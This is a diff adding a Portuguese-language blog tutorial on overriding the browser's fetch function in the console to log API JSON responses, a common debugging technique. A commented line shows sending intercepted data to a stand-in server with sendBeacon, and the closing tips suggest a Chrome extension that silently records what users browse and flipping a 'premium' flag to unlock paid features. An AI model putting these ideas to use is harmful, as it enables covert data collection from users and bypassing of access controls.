@@ -1,0 +1,52 @@
+---
+title: "Hooking: Interceptando dados secretos no Console"
+date: "2026-02-21"
+category: "scripts"
+description: "Como sobrescrever a função nativa fetch para ler JSONs e respostas de API antes do próprio site."
+---
+
+Sabe quando você entra num site de dashboard ou e-commerce e os dados aparecem na tela? Antes de virar HTML, esses dados chegaram como JSON.
+E muitas vezes, esse JSON tem muito mais informação do que o site mostra (e-mails, IDs ocultos, status de admin, preços de custo).
+
+A técnica de **Hooking** consiste em substituir a função original do navegador pela sua. O site continua funcionando, mas agora tudo passa pelo seu "pedágio".
+
+## O Código (Cole no Console do Navegador)
+
+```javascript
+// 1. Salva a função original (para não quebrar o site)
+const originalFetch = window.fetch;
+
+// 2. Sobrescreve a função fetch com a nossa espiã
+window.fetch = async (...args) => {
+    // args[0] é a URL que o site está chamando
+    const url = args[0].toString();
+    
+    // Deixa a requisição acontecer normalmente
+    const response = await originalFetch(...args);
+    
+    // Clona a resposta (porque o corpo só pode ser lido uma vez)
+    const clone = response.clone();
+    
+    // FILTRO: Só quero ver se for JSON e se tiver "user" ou "price" na URL
+    if (url.includes("api") || url.includes("json")) {
+        clone.json().then(data => {
+            console.groupCollapsed(`🪝 API Interceptada: ${url}`);
+            console.log("Dados Recebidos:", data);
+            
+            // Dica: Aqui você poderia enviar esses dados pro seu servidor
+            // navigator.sendBeacon('[http://meu-servidor.com/log](http://meu-servidor.com/log)', JSON.stringify(data));
+            
+            console.groupEnd();
+        }).catch(() => {});
+    }
+
+    return response;
+};
+
+console.log("🔥 Hook ativado! Navegue no site e olhe o console.");
+Por que isso é poderoso?
+Debug Real: Você vê exatamente o que o servidor está mandando, sem filtros.
+
+Scraping Passivo: Você pode transformar isso numa extensão do Chrome. O usuário navega normalmente, e seu script vai salvando todos os produtos que aparecem na tela num banco de dados silenciosamente.
+
+Modificação: Você pode alterar o JSON antes do site ler. Imagine mudar premium: false para premium: true no retorno da API e ver se o site libera as funções.
